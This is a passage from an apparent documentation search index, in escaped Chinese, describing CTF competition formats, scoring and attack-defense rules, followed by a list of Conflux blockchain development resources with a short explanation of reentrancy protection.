60%\u3002","title":"\u89e3\u9898\u7ade\u6280"},{"location":"introduction/mode/#_5","text":"\u6bd4\u8d5b\u7ed3\u675f\u540e\uff0c\u961f\u4f0d\u4f11\u606f\uff0c\u5e76\u51c6\u5907\u5236\u4f5c\u5206\u4eab PPT\uff08\u4e5f\u53ef\u4ee5\u5728\u51fa\u9898\u9636\u6bb5\u51c6\u5907\u597d\uff09\u3002\u5206\u4eab\u4f1a\u65f6\uff0c\u5404\u961f\u6d3e 2 \u540d\u961f\u5458\u4e0a\u53f0\u5206\u4eab\u51fa\u9898\u89e3\u9898\u601d\u8def\uff0c\u5b66\u4e60\u8fc7\u7a0b\u4ee5\u53ca\u8003\u5bdf\u77e5\u8bc6\u70b9\u7b49\u3002\u5728\u6f14\u793a\u7ed3\u675f\u540e\u8fdb\u5165\u4e92\u52a8\u8ba8\u8bba\u73af\u8282\uff0c\u89e3\u8bf4\u4ee3\u8868\u9700\u8981\u56de\u7b54\u8bc4\u59d4\u548c\u5176\u4ed6\u9009\u624b\u63d0\u51fa\u7684\u95ee\u9898\u3002\u89e3\u8bf4\u6ca1\u6709\u592a\u591a\u7684\u65f6\u95f4\u9650\u5236\uff0c\u4f46\u662f\u65f6\u95f4\u7528\u91cf\u662f\u8bc4\u5206\u7684\u4e00\u4e2a\u6807\u51c6\u3002","title":"\u5206\u4eab\u8ba8\u8bba"},{"location":"introduction/mode/#_6","text":"\u51fa\u9898\u79ef\u5206\uff08\u5360\u603b\u5206 30%\uff09\u6709 50% \u7531\u8bc4\u59d4\u6839\u636e\u9898\u76ee\u63d0\u4ea4\u7684\u8be6\u7ec6\u7a0b\u5ea6\uff0c\u5b8c\u6574\u5ea6\uff0c\u63d0\u4ea4\u65f6\u95f4\u7b49\u8fdb\u8bc4\u5206\uff0c\u53e6\u5916 50% \u5219\u6839\u636e\u6bd4\u8d5b\u7ed3\u675f\u540e\u7684\u6700\u7ec8\u89e3\u9898\u60c5\u51b5\u8fdb\u884c\u8bc4\u5206\u3002\u8ba1\u5206\u516c\u5f0f\u793a\u4f8b\uff1a Score = MaxScore -- | N -- Expect\uff3fN | \u3002N\u4ee3\u8868\u89e3\u51fa\u8be5\u9898\u7684\u961f\u4f0d\u6570\u91cf\uff0c\u800c Expect\uff3fN \u5219\u662f\u8fd9\u9053\u9898\u9884\u671f\u89e3\u51fa\u7684\u9898\u76ee\u6570\u91cf\u3002\u53ea\u6709\u5f53\u9898\u76ee\u96be\u5ea6\u9002\u4e2d\uff0c\u89e3\u9898\u961f\u4f0d\u6570\u91cf\u8d8a\u63a5\u8fd1\u9884\u671f\u6570\u91cf Expect\uff3fN\uff0c\u5219\u8fd9\u9053\u9898\u7684\u51fa\u9898\u961f\u4f0d\u5f97\u5230\u7684\u51fa\u9898\u79ef\u5206\u8d8a\u9ad8\u3002 \u89e3\u9898\u79ef\u5206\uff08\u5360\u603b\u79ef\u5206 60%\uff09\u5728\u8ba1\u7b97\u65f6\u4e0d\u8003\u8651 First Blood \u5956\u52b1\u3002 \u5206\u4eab\u79ef\u5206\uff08\u5360 10%\uff09\u7531\u8bc4\u59d4\u548c\u5176\u4ed6\u961f\u4f0d\u6839\u636e\u5176\u6280\u672f\u5206\u4eab\u5185\u5bb9\u8fdb\u884c\u8bc4\u5206\u5f97\u51fa\uff08\u8003\u8651\u5206\u4eab\u65f6\u95f4\u4ee5\u53ca\u5176\u4ed6\u9650\u5236\uff09\uff0c\u4f1a\u8ba1\u7b97\u5e73\u5747\u503c\u3002","title":"\u8ba1\u5206\u89c4\u5219"},{"location":"introduction/mode/#_7","text":"\u8d5b\u5236\u4e2d\u5c06 Challenge \u7684\u51fa\u9898\u65b9\u4ea4\u7531\u53d7\u9080\u6218\u961f\uff0c\u8ba9\u6218\u961f\u80fd\u5c3d\u81ea\u5df1\u6240\u80fd\u4e92\u76f8\u51fa\u9898\uff0c\u6bd4\u8d5b\u96be\u5ea6\u548c\u8303\u56f4\u4e0d\u4f1a\u88ab\u4e3b\u529e\u65b9\u6c34\u5e73\u9650\u5236\uff0c\u540c\u65f6\u4e5f\u80fd\u63d0\u9ad8 Challenge \u7684\u8d28\u91cf\uff0c\u6bcf\u4e2a\u6218\u961f\u90fd\u80fd\u6709\u4e0d\u4e00\u6837\u7684\u4f53\u9a8c\u4e0e\u63d0\u5347\u3002\u5728\"\u5206\u4eab\"\u73af\u8282\uff0c\u5bf9\u672c\u961f\u9898\u76ee\u8fdb\u884c\u8bb2\u89e3\u7684\u540c\u65f6\u4e5f\u5728\u63d0\u9ad8\u81ea\u5df1\u7684\u80fd\u529b\u6c34\u5e73\uff0c\u5728\u8ba8\u8bba\u56de\u7b54\u7684\u8fc7\u7a0b\u66f4\u662f\u4e00\u79cd\u601d\u7ef4\u4e92\u52a8\u7684\u73af\u8282\u3002\u53ef\u4ee5\u5728\u8d5b\u540e\u7684\u5b66\u4e60\u603b\u7ed3\u4e2d\u80fd\u5f97\u5230\u66f4\u597d\u7684\u8ba4\u77e5\u3002","title":"\u8d5b\u5236\u603b\u8bc4"},{"location":"introduction/mode/#-attack-defense","text":"","title":"\u653b\u9632\u6a21\u5f0f - Attack &amp; Defense"},{"location":"introduction/mode/#_8","text":"\u653b\u9632\u6a21\u5f0f\u5e38\u89c1\u4e8e\u7ebf\u4e0b\u51b3\u8d5b\u3002\u5728\u653b\u9632\u6a21\u5f0f\u4e2d\uff0c\u521d\u59cb\u65f6\u523b\uff0c\u6240\u6709\u53c2\u8d5b\u961f\u4f0d\u62e5\u6709\u76f8\u540c\u7684\u7cfb\u7edf\u73af\u5883\uff08\u5305\u542b\u82e5\u5e72\u670d\u52a1\uff0c\u53ef\u80fd\u4f4d\u4e8e\u4e0d\u540c\u7684\u673a\u5668\u4e0a\uff09\uff0c\u5e38\u79f0\u4e3a gamebox\uff0c\u53c2\u8d5b\u961f\u4f0d\u6316\u6398\u7f51\u7edc\u670d\u52a1\u6f0f\u6d1e\u5e76\u653b\u51fb\u5bf9\u624b\u670d\u52a1\u83b7\u53d6 flag \u6765\u5f97\u5206\uff0c\u4fee\u8865\u81ea\u8eab\u670d\u52a1\u6f0f\u6d1e\u8fdb\u884c\u9632\u5fa1\u4ece\u800c\u9632\u6b62\u6263\u5206\uff08\u4e00\u822c\u6765\u8bf4\u9632\u5fa1\u53ea\u80fd\u907f\u514d\u4e22\u5206\uff0c\u5f53\u7136\u6709\u7684\u6bd4\u8d5b\u5728\u9632\u5fa1\u4e0a\u53ef\u4ee5\u5f97\u5206\uff09\u3002 \u653b\u9632\u6a21\u5f0f\u53ef\u4ee5\u5b9e\u65f6\u901a\u8fc7\u5f97\u5206\u53cd\u6620\u51fa\u6bd4\u8d5b\u60c5\u51b5\uff0c\u6700\u7ec8\u4e5f\u4ee5\u5f97\u5206\u76f4\u63a5\u5206\u51fa\u80dc\u8d1f\uff0c\u662f\u4e00\u79cd\u7ade\u4e89\u6fc0\u70c8\uff0c\u5177\u6709\u5f88\u5f3a\u89c2\u8d4f\u6027\u548c\u9ad8\u5ea6\u900f\u660e\u6027\u7684\u7f51\u7edc\u5b89\u5168\u8d5b\u5236\u3002\u5728\u8fd9\u79cd\u8d5b\u5236\u4e2d\uff0c\u4e0d\u4ec5\u4ec5\u662f\u6bd4\u53c2\u8d5b\u961f\u5458\u7684\u667a\u529b\u548c\u6280\u672f\uff0c\u4e5f\u6bd4\u4f53\u529b\uff08\u56e0\u4e3a\u6bd4\u8d5b\u4e00\u822c\u90fd\u4f1a\u6301\u7eed 48 \u5c0f\u65f6\uff09\uff0c\u540c\u65f6\u4e5f\u6bd4\u56e2\u961f\u4e4b\u95f4\u7684\u5206\u5de5\u914d\u5408\u4e0e\u5408\u4f5c\u3002 \u4e00\u822c\u6bd4\u8d5b\u7684\u5177\u4f53\u73af\u5883\u4f1a\u5728\u5f00\u8d5b\u524d\u4e00\u5929\u6216\u8005\u5f53\u5929\u5f00\u8d5b\u524d\u534a\u5c0f\u65f6\u7531\u6bd4\u8d5b\u4e3b\u529e\u65b9\u7ed9\u51fa\uff08\u662f\u4e00\u4efd\u51e0\u9875\u7684\u5c0f\u6587\u6863\uff09\u3002\u5728\u8fd9\u4e00\u6bb5\u65f6\u95f4\u5185\uff0c\u4f60\u9700\u8981\u6839\u636e\u4e3b\u529e\u65b9\u63d0\u4f9b\u7684\u6587\u6863\u719f\u6089\u73af\u5883\u5e76\u505a\u597d\u9632\u5fa1\u3002 \u5728\u6bd4\u8d5b\u5f00\u59cb\u524d\u534a\u5c0f\u65f6\uff0c\u8fd9\u534a\u5c0f\u65f6\u5185\u662f\u65e0\u6cd5\u8fdb\u884c\u653b\u51fb\u7684\uff0c\u5404\u652f\u961f\u4f0d\u90fd\u4f1a\u52a0\u7d27\u719f\u6089\u6bd4\u8d5b\u7f51\u7edc\u73af\u5883\uff0c\u5e76\u505a\u597d\u9632\u5fa1\u51c6\u5907\u3002\u81f3\u4e8e\u654c\u65b9 Gamebox \u7684 IP \u5730\u5740\uff0c\u5219\u9700\u8981\u9760\u4f60\u81ea\u5df1\u5728\u7ed9\u51fa\u7f51\u6bb5\u4e2d\u53d1\u73b0\u3002 \u5982\u679c\u662f\u5206\u4e3a\u4e0a\u5348\u4e0b\u5348\u4e24\u573a\u653b\u9632\u8d5b\u7684\u8bdd\uff0c\u90a3\u4e48\u4e0a\u5348\u548c\u4e0b\u5348\u7684 Gamebox \u6f0f\u6d1e\u670d\u52a1\u4f1a\u66f4\u6362\uff08\u907f\u514d\u6bd4\u8d5b\u4e2d\u9014\u4f11\u606f\u65f6\u9009\u624b\u4ea4\u6d41\uff09\uff0c\u4f46\u7ba1\u7406\u65f6\u8981\u7528\u7684 IP \u5730\u5740\u4ec0\u4e48\u7684\u4e0d\u4f1a\u6539\u53d8\u3002\u4e5f\u5c31\u662f \u4e0b\u5348\u4f1a\u6362\u65b0\u9898 \u3002 \u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u4e3b\u529e\u65b9\u4f1a\u63d0\u4f9b\u7f51\u7ebf\uff0c \u4f46\u5e76\u4e0d\u4f1a\u63d0\u4f9b\u7f51\u7ebf\u8f6c\u63a5\u53e3\uff0c\u6240\u4ee5\u9700\u8981\u81ea\u5907\u3002","title":"\u6982\u8ff0"},{"location":"introduction/mode/#_9","text":"\u653b\u9632\u6a21\u5f0f\u4e00\u822c\u7684\u89c4\u5219\u5982\u4e0b \u6218\u961f\u521d\u59cb\u5206\u6570\u5747\u4e3a x \u5206 \u6bd4\u8d5b\u4ee5 5/10 \u5206\u949f\u4e3a\u4e00\u4e2a\u56de\u5408\uff0c\u6bcf\u56de\u5408\u4e3b\u529e\u65b9\u4f1a\u66f4\u65b0\u5df2\u653e\u51fa\u670d\u52a1\u7684 Flag \u6bcf\u56de\u5408\u5185\uff0c\u4e00\u4e2a\u6218\u961f\u7684\u4e00\u4e2a\u670d\u52a1\u88ab\u6e17\u900f\u653b\u51fb\u6210\u529f\uff08\u88ab\u62ff Flag \u5e76\u63d0\u4ea4\uff09\uff0c\u5219\u6263\u9664\u4e00\u5b9a\u5206\u6570\uff0c\u653b\u51fb\u6210\u529f\u7684\u6218\u961f\u5e73\u5206\u8fd9\u4e9b\u5206\u6570\u3002 \u6bcf\u56de\u5408\u5185\uff0c\u5982\u679c\u6218\u961f\u80fd\u591f\u7ef4\u62a4\u81ea\u5df1\u7684\u670d\u52a1\u6b63\u5e38\u8fd0\u884c\uff0c\u5219\u5206\u6570\u4e0d\u4f1a\u51cf\u5c11\uff08\u5982\u679c\u9632\u5fa1\u6210\u529f\u52a0\u5206\u5219\u4f1a\u52a0\u5206\uff09\uff1b \u5982\u679c\u4e00\u4e2a\u670d\u52a1\u5b95\u673a\u6216\u5f02\u5e38\u65e0\u6cd5\u901a\u8fc7\u6d4b\u8bd5\uff0c\u5219\u53ef\u80fd\u4f1a\u6263\u5206\uff0c\u670d\u52a1\u6b63\u5e38\u7684\u6218\u961f\u5e73\u5206\u8fd9\u4e9b\u5206\u3002\u5f80\u5f80\u670d\u52a1\u5f02\u5e38\u4f1a\u6263\u9664\u8f83\u591a\u7684\u5206\u6570\u3002 \u5982\u679c\u8be5\u56de\u5408\u5185\u6240\u6709\u6218\u961f\u7684\u670d\u52a1\u90fd\u5f02\u5e38\uff0c\u5219\u8ba4\u4e3a\u662f\u4e0d\u53ef\u6297\u62d2\u56e0\u7d20\u9020\u6210\uff0c\u5206\u6570\u90fd\u4e0d\u51cf\u5c11\u3002 \u6bcf\u56de\u5408\u5185\uff0c\u670d\u52a1\u5f02\u5e38\u548c\u88ab\u62ff Flag \u53ef\u4ee5\u540c\u65f6\u53d1\u751f\uff0c\u5373\u6218\u961f\u5728\u4e00\u4e2a\u56de\u5408\u5185\u5355\u4e2a\u670d\u52a1\u53ef\u80fd\u4f1a\u6263\u9664\u4e24\u8005\u53e0\u52a0\u7684\u5206\u6570\u3002 \u7981\u6b62\u961f\u4f0d\u4f7f\u7528\u901a\u7528\u9632\u5fa1\u65b9\u6cd5 \u8bf7\u53c2\u8d5b\u961f\u4f0d\u5728\u6bd4\u8d5b\u5f00\u59cb\u65f6\u5bf9\u6240\u6709\u670d\u52a1\u8fdb\u884c\u5907\u4efd\uff0c\u82e5\u56e0\u81ea\u8eab\u539f\u56e0\u5bfc\u81f4\u670d\u52a1\u6c38\u4e45\u635f\u574f\u6216\u4e22\u5931\uff0c\u65e0\u6cd5\u6062\u590d\uff0c\u4e3b\u529e\u65b9\u4e0d\u63d0\u4f9b\u91cd\u7f6e\u670d\u52a1 \u7981\u6b62\u5bf9\u8d5b\u9898\u4ee5\u5916\u7684\u6bd4\u8d5b\u5e73\u53f0\u53d1\u8d77\u653b\u51fb\uff0c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\u5728 gamebox \u63d0\u6743 root\u3001\u5229\u7528\u4e3b\u529e\u65b9\u5e73\u53f0\u6f0f\u6d1e\u7b49\uff0c\u8fdd\u89c4\u8005\u7acb\u523b\u88ab\u53d6\u6d88\u53c2\u8d5b\u8d44\u683c \u53c2\u8d5b\u961f\u4f0d\u5982\u679c\u53d1\u73b0\u5176\u4ed6\u961f\u4f0d\u5b58\u5728\u8fdd\u89c4\u884c\u4e3a\uff0c\u8bf7\u7acb\u523b\u4e3e\u62a5\uff0c\u6211\u4eec\u4f1a\u4e25\u683c\u5ba1\u6838\u5e76\u4f5c\u51fa\u76f8\u5e94\u5224\u7f5a\u3002","title":"\u57fa\u672c\u89c4\u5219"},{"location":"introduction/mode/#_10","text":"\u6587\u6863\u4e0a\u4e00\u822c\u90fd\u4f1a\u6709\u6bd4\u8d5b\u73af\u5883\u7684 \u7f51\u7edc\u62d3\u6251\u56fe \uff08\u5982\u4e0b\u56fe\uff09\uff0c\u6bcf\u652f\u961f\u4f0d\u4f1a\u7ef4\u62a4\u82e5\u5e72\u7684 Gamebox\uff08\u5df1\u65b9\u670d\u52a1\u5668\uff09 \uff0cGamebox \u4e0a\u90e8\u7f72\u6709\u5b58\u5728\u6f0f\u6d1e\u7684\u670d\u52a1\u3002 \u6587\u6863\u4e0a\u4f1a\u5305\u62ec\u9009\u624b\uff0c\u653b\u9632\u73af\u5883\uff0c\u4e3b\u529e\u65b9\u4e09\u8005\u7684\u73af\u5883\u3002 \u9009\u624b\u9700\u8981\u5728\u4e2a\u4eba\u7535\u8111\u4e0a\u914d\u7f6e\u6216\u8005 DHCP \u81ea\u52a8\u83b7\u53d6 IP \u5730\u5740 \u7f51\u5173 \u63a9\u7801DNS \u670d\u52a1\u5668\u5730\u5740 \u653b\u9632\u73af\u5883 Gamebox \u6240\u5904\u5730\u5740\uff0c\u5305\u62ec\u5df1\u65b9\u548c\u5176\u4ed6\u961f\u4f0d\u7684\u5730\u5740\u3002 \u6bd4\u8d5b\u4e00\u822c\u4f1a\u63d0\u4f9b\u961f\u4f0d\u7684 id \u4e0e\u5bf9\u5e94 ip \u7684\u6620\u5c04\u8868\uff0c\u4ee5\u4fbf\u4e8e\u8ba9\u9009\u624b\u6307\u5b9a\u6070\u5f53\u7684\u653b\u9632\u7b56\u7565\u3002 \u4e3b\u529e\u65b9\u73af\u5883 \u6bd4\u8d5b\u7b54\u9898\u5e73\u53f0 \u63d0\u4ea4 flag \u63a5\u53e3 \u6d41\u91cf\u8bbf\u95ee\u63a5\u53e3","title":"\u7f51\u7edc\u73af\u5883"},{"location":"introduction/mode/#gamebox","text":"\u53c2\u8d5b\u6587\u6863\u4e2d\u4f1a\u7ed9\u51fa\u961f\u4f0d\u767b\u5f55 gamebox \u7684\u65b9\u5f0f\uff0c\u4e00\u822c\u6765\u8bf4\u5982\u4e0b \u7528\u6237\u540d\u4e3a ctf \u4e00\u822c\u4f1a\u901a\u8fc7 ssh \u767b\u5f55\uff0c\u767b\u5f55\u65b9\u5f0f\u4e3a\u5bc6\u7801\u6216\u8005\u79c1\u94a5\u3002 \u81ea\u7136\uff0c\u5728\u767b\u5f55\u4e0a\u6218\u961f\u673a\u5668\u540e\u5e94\u8be5\u4fee\u6539\u6240\u6709\u7684\u9ed8\u8ba4\u5bc6\u7801\uff0c\u540c\u65f6\u4e0d\u5e94\u8be5\u8bbe\u7f6e\u5f31\u5bc6\u7801\u3002","title":"\u8bbf\u95ee Gamebox"},{"location":"introduction/resources/","text":"\u5f00\u53d1\u8d44\u6e90 \u00b6 \u5e38\u7528 \u00b6 Conflux\u5bf9\u63a5Q&A Conflux-faqs\u5408\u96c6 Conflux\u516c\u4f17\u53f7\u6280\u672f\u6587\u7ae0&\u6559\u7a0b&\u89c6\u9891&\u6f2b\u753b\u76ee\u5f55 Conflux UI\u5e93 \u5f00\u53d1\u8bf4\u660e \u00b6 Conflux\u7684 CVM \u548c EVM \u865a\u62df\u673a\u5c42\u7684\u4e3b\u8981\u533a\u522b \u5f53\u524d\u7248\u672cConflux \u9ed8\u8ba4\u6709\u53cd\u91cd\u5165\u673a\u5236\u3002\u91cd\u5165\u6307\u7684\u662f\u4e00\u4e2a\u5408\u7ea6\u5728\u8c03\u7528\u5176\u4ed6\u5408\u7ea6\u65f6\uff0c\u5176\u4ed6\u5408\u7ea6\u53c8\u76f4\u63a5\u6216\u95f4\u63a5\u5730\u8c03\u7528\u4e86\u8fd9\u4e2a\u5408\u7ea6\u3002\u6bd4\u5982\u5408\u7ea6 A \u8c03\u7528\u5408\u7ea6 B, \u5728\u5408\u7ea6 B \u6267\u884c\u671f\u95f4\uff0c\u53c8\u8c03\u7528\u4e86\u5408\u7ea6 A, \u5219\u6784\u6210\u4e86\u91cd\u5165\u8c03\u7528\u3002\u91cd\u5165\u8c03\u7528\u662f\u4e00\u4e9b Defi \u653b\u51fb\u7684\u539f\u56e0\u3002\u4f46\u662f\uff0c\u4e00\u4e9b\u903b\u8f91\u6b63\u5e38\u7684\u5408\u7ea6\u4e5f\u4f1a\u6709\u91cd\u5165\u8c03\u7528\u3002\u6bd4\u5982\u8bf4\uff0c\u5408\u7ea6 A \u8c03\u7528\u95ea\u7535\u8d37\u5408\u7ea6\uff0c\u95ea\u7535\u8d37\u8c03\u7528\u5408\u7ea6 A \u7684 callback \u51fd\u6570\uff0c\u5c31\u6784\u6210\u91cd\u5165\u8c03\u7528\u3002 Conflux \u9ed8\u8ba4\u5f00\u542f\u53cd\u91cd\u5165\u673a\u5236\uff0c\u5373\u91cd\u5165\u8c03\u7528\u53d1\u751f\u540e\uff0c\u6240\u6709\u5199\u64cd\u4f5c\u5c06\u88ab\u7981\u6b62\uff0c\u5305\u62ec\uff1a\u5411\u8d26\u672c\u5199\u5165\u6570\u636e \uff08SSTORE \u6307\u4ee4\uff09\uff0c\u53d1\u8d77\u6709\u8f6c\u8d26\u7684\u5408\u7ea6\u8c03\u7528\uff0c\u751f\u6210 event CIP \u00b6 Conflux \u6539\u8fdb\u63d0\u6848 Conflux CIP\u4ecb\u7ecd \u6280\u672f\u8bba\u575b \u00b6 Conflux\u793e\u533a\u8bba\u575b \u8282\u70b9\u4e0eRPC \u00b6 Conflux GPU \u6316\u77ff\u6559\u7a0b\u6587\u6863\uff08v1.1.2\uff09 Conflux\u7f51\u7edc\u4e2d\"\u5947\u5947\u602a\u602a\u201c\u7684Node Conflux RPC \u548c\u4ee5\u592a\u574a RPC\u7684 \u533a\u522b json rpc Conflux RPC \u5730\u5740\u5217\u8868(\u4ec5\u4f9b\u5f00\u53d1\u6d4b\u8bd5\u4f7f\u7528\uff0c\u4e0d\u4fdd\u8bc1\u53ef\u7528\u6027) \u5982\u4f55\u914d\u7f6e\u81ea\u5df1\u8282\u70b9\u7684rpc\u7aef\u53e3\u548c\u6570\u636e\u5b58\u653e\u8def\u5f84 Conflux\u7f51\u7edc\u4e0a\u9996\u6b3e\u7c7bInfura API\u8bbf\u95ee\u670d\u52a1\u9650\u65f6\u516c\u6d4b\u4e2d Conflux\u5f00\u53d1\u8005\u6587\u6863 \u00b6 \u5b98\u7f51 js-conflux-sdk Conflux js-sdk\u4e0e\u4ee5\u592a\u574aweb3. js\u533a\u522b \u5982\u4f55\u5728Conflux\u7f51\u7edc\u4e2d\u4f7f\u7528js-conflux-sdk\u6765\u6784\u5efa\u4e00\u4e2a\u7b80\u5355\u7684DApp onflux \u667a\u80fd\u5408\u7ea6\u5f00\u53d1\u4f53\u9a8c(js-conflux-sdk@0.13.4) java-conflux-sdk go-conflux-sdk Conflux SDK \u4f7f\u7528\u4f53\u9a8c\u6536\u96c6 Dex\u5f00\u53d1\u6587\u6863 \u00b6 \u5f00\u53d1\u6587\u6863 Conflux \u8fdb\u9636\u8bfe | DEX \u53cc\u5b50\u534f\u8bae\uff1a\u94fe\u4e0a\u7ed3\u7b97 BoomFlow & \u94fe\u4e0b\u64ae\u5408 MatchFlow Conflux Shuttleflow\u6587\u6863 \u4f7f\u7528ShuttleFlow\u5b9e\u73b0ETH\u548ccETH\u4e4b\u95f4\u7684\u8f6c\u6362 \u5982\u4f55\u4f7f\u7528 ShuttleFlow \u5b9e\u73b0\u7075\u6d3b\u8de8\u94fe \u5185\u7f6e\u5408\u7ea6 \u00b6 \u5185\u7f6e\u5408\u7ea6 Conflux \u5185\u7f6e\u5408\u7ea6\u529f\u80fd\u8be6\u7ec6\u4ecb\u7ecd Conflux\u7684\u5b58\u50a8\u62b5\u62bc\u673a\u5236 \u65b0\u9879\u76ee\u5982\u4f55\u9ad8\u6548\u542f\u52a8\uff1fConflux \u4ee3\u4ed8\u673a\u5236\u4e86\u89e3\u4e00\u4e0b \u5f00\u53d1\u5de5\u5177\u6307\u5357 \u00b6 Conflux\u4e0e\u4ee5\u592a\u574a\u5408\u7ea6\u5f00\u53d1\u5de5\u5177\u533a\u522b [Conflux \u5f00\u53d1\u6559\u7a0b | \u4f7f\u7528 IDE \u5f00\u53d1 DApp \u7684\u5b9e\u6218\u64cd\u4f5c\u6307\u5357\uff1a] https://forum.conflux.fun/t/topic/1680/ ) Conflux Studio \u5f00\u53d1 DApp \u6559\u7a0b Conflux-truffle Conflux Truffle \u4f7f\u7528\u5b8c\u5168\u6307\u5357 Conflux-remix\uff08Conflux\u793e\u533a\u81ea\u884c\u5f00\u53d1\uff09 \u4f7f\u7528Remix\u73a9\u8f6cConflux\u4e0a\u7684\u667a\u80fd\u5408\u7ea6","title":"\u5f00\u53d1\u8d44\u6e90"},{"location":"introduction/resources/#_1","text":"","title":"\u5f00\u53d1\u8d44\u6e90"},{"location":"introduction/resources/#_2","text":"Conflux\u5bf9\u63a5Q&A Conflux-faqs\u5408\u96c6 Conflux\u516c\u4f17\u53f7\u6280\u672f\u6587\u7ae0&\u6559\u7a0b&\u89c6\u9891&\u6f2b\u753b\u76ee\u5f55 Conflux UI\u5e93","title":"\u5e38\u7528"},{"location":"introduction/resources/#_3","text":"Conflux\u7684 CVM \u548c EVM \u865a\u62df\u673a\u5c42\u7684\u4e3b\u8981\u533a\u522b \u5f53\u524d\u7248\u672cConflux \u9ed8\u8ba4\u6709\u53cd\u91cd\u5165\u673a\u5236\u3002\u91cd\u5165\u6307\u7684\u662f\u4e00\u4e2a\u5408\u7ea6\u5728\u8c03\u7528\u5176\u4ed6\u5408\u7ea6\u65f6\uff0c\u5176\u4ed6\u5408\u7ea6\u53c8\u76f4\u63a5\u6216\u95f4\u63a5\u5730\u8c03\u7528\u4e86\u8fd9\u4e2a\u5408\u7ea6\u3002\u6bd4\u5982\u5408\u7ea6 A \u8c03\u7528\u5408\u7ea6 B, \u5728\u5408\u7ea6 B \u6267\u884c\u671f\u95f4\uff0c\u53c8\u8c03\u7528\u4e86\u5408\u7ea6 A, \u5219\u6784\u6210\u4e86\u91cd\u5165\u8c03\u7528\u3002\u91cd\u5165\u8c03\u7528\u662f\u4e00\u4e9b Defi \u653b\u51fb\u7684\u539f\u56e0\u3002\u4f46\u662f\uff0c\u4e00\u4e9b\u903b\u8f91\u6b63\u5e38\u7684\u5408\u7ea6\u4e5f\u4f1a\u6709\u91cd\u5165\u8c03\u7528\u3002\u6bd4\u5982\u8bf4\uff0c\u5408\u7ea6 A \u8c03\u7528\u95ea\u7535\u8d37\u5408\u7ea6\uff0c\u95ea\u7535\u8d37\u8c03\u7528\u5408\u7ea6 A \u7684 callback \u51fd\u6570\uff0c\u5c31\u6784\u6210\u91cd\u5165\u8c03\u7528\u3002 Conflux \u9ed8\u8ba4\u5f00\u542f\u53cd\u91cd\u5165\u673a\u5236\uff0c\u5373\u91cd\u5165\u8c03\u7528\u53d1\u751f\u540e\uff0c\u6240\u6709\u5199\u64cd\u4f5c\u5c06\u88ab\u7981\u6b62\uff0c\u5305\u62ec\uff1a\u5411\u8d26\u672c\u5199\u5165\u6570\u636e \uff08SSTORE \u6307\u4ee4\uff09\uff0c\u53d1\u8d77\u6709\u8f6c\u8d26\u7684\u5408\u7ea6\u8c03\u7528\uff0c\u751f\u6210 event","title":"\u5f00\u53d1\u8bf4\u660e"},{"location":"introduction/resources/#cip","text":"Conflux \u6539\u8fdb\u63d0\u6848 Conflux CIP\u4ecb\u7ecd","title":"CIP"},{"location":"introduction/resources/#_4","text":"Conflux\u793e\u533a\u8bba\u575b","title":"\u6280\u672f\u8bba\u575b"},{"location":"introduction/resources/#rpc","text":"Conflux GPU \u6316\u77ff\u6559\u7a0b\u6587\u6863\uff08v1.1.2\uff09 Conflux\u7f51\u7edc\u4e2d\"\u5947\u5947\u602a\u602a\u201c\u7684Node Conflux RPC \u548c\u4ee5\u592a\u574a RPC\u7684 \u533a\u522b json rpc Conflux RPC \u5730\u5740\u5217\u8868(\u4ec5\u4f9b\u5f00\u53d1\u6d4b\u8bd5\u4f7f\u7528\uff0c\u4e0d\u4fdd\u8bc1\u53ef\u7528\u6027) \u5982\u4f55\u914d\u7f6e\u81ea\u5df1\u8282\u70b9\u7684rpc\u7aef\u53e3\u548c\u6570\u636e\u5b58\u653e\u8def\u5f84 Conflux\u7f51\u7edc\u4e0a\u9996\u6b3e\u7c7bInfura API\u8bbf\u95ee\u670d\u52a1\u9650\u65f6\u516c\u6d4b\u4e2d","title":"\u8282\u70b9\u4e0eRPC"},{"location":"introduction/resources/#conflux","text":"\u5b98\u7f51 js-conflux-sdk Conflux js-sdk\u4e0e\u4ee5\u592a\u574aweb3. js\u533a\u522b \u5982\u4f55\u5728Conflux\u7f51\u7edc\u4e2d\u4f7f\u7528js-conflux-sdk\u6765\u6784\u5efa\u4e00\u4e2a\u7b80\u5355\u7684DApp onflux \u667a\u80fd\u5408\u7ea6\u5f00\u53d1\u4f53\u9a8c(js-conflux-sdk@0.13.4) java-conflux-sdk go-conflux-sdk Conflux SDK \u4f7f\u7528\u4f53\u9a8c\u6536\u96c6","title":"Conflux\u5f00\u53d1\u8005\u6587\u6863"},{"location":"introduction/resources/#dex","text":"\u5f00\u53d1\u6587\u6863 Conflux \u8fdb\u9636\u8bfe | DEX \u53cc\u5b50\u534f\u8bae\uff1a\u94fe\u4e0a\u7ed3\u7b97 BoomFlow & \u94fe\u4e0b\u64ae\u5408 MatchFlow Conflux Shuttleflow\u6587\u6863 \u4f7f\u7528ShuttleFlow\u5b9e\u73b0ETH\u548ccETH\u4e4b\u95f4\u7684\u8f6c\u6362 \u5982\u4f55\u4f7f\u7528 ShuttleFlow \u5b9e\u73b0\u7075\u6d3b\u8de8\u94fe","title":"Dex\u5f00\u53d1\u6587\u6863"},{"location":"introduction/resources/#_5","text":"\u5185\u7f6e\u5408\u7ea6 Conflux \u5185\u7f6e\u5408\u7ea6\u529f\u80fd\u8be6\u7ec6\u4ecb\u7ecd Conflux\u7684\u5b58\u50a8\u62b5\u62bc\u673a\u5236 \u65b0\u9879\u76ee\u5982\u4f55\u9ad8\u6548\u542f\u52a8\uff1fConflux \u4ee3\u4ed8\u673a\u5236\u4e86\u89e3\u4e00\u4e0b","title":"\u5185\u7f6e\u5408\u7ea6"},{"location":"introduction/resources/#_6","text":"Conflux\u4e0e\u4ee5\u592a\u574a\u5408\u7ea6\u5f00\u53d1\u5de5\u5177\u533a\u522b [Conflux \u5f00\u53d1\u6559\u7a0b | \u4f7f\u7528 IDE \u5f00\u53d1 DApp \u7684\u5b9e\u6218\u64cd\u4f5c\u6307\u5357\uff1a] https://forum.conflux.fun/t/topic/1680/ ) Conflux Studio \u5f00\u53d1 DApp \u6559\u7a0b Conflux-truffle Conflux Truffle \u4f7f\u7528\u5b8c\u5168\u6307\u5357 Conflux-remix\uff08Conflux\u793e\u533a\u81ea\u884c\u5f00\u53d1\uff09 \u4f7f\u7528Remix\u73a9\u8f6cConflux\u4e0a\u7684\u667a\u80fd\u5408\u7ea6","title":"\u5f00\u53d1\u5de5\u5177\u6307\u5357"},{"location":"nft/introduction/","text":"\u521d\u8bc6NFT \u00b6 \u4f55\u4e3aNFT \u00b6 